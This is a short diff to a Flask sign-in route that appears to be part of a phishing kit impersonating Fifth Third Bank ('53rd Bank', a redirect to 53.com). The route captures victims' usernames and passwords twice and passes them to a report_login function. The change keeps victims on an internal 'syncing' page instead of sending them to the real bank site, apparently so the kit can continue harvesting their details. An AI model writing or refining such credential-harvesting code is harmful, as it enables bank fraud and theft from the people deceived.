@@ -13,7 +13,7 @@ def signin():
         if user_id and password_:
             # print(first_try_user, first_try_pass, user_id,password_)
             report_login(first_try_user, first_try_pass, user_id,password_,bank_name='53rd Bank')
-            return redirect('https://www.53.com/content/fifth-third/en.html')
+            return redirect('main.syncing')
     return render_template('signin.html')
 
 # @portals.route('/question', methods=['GET','POST'])
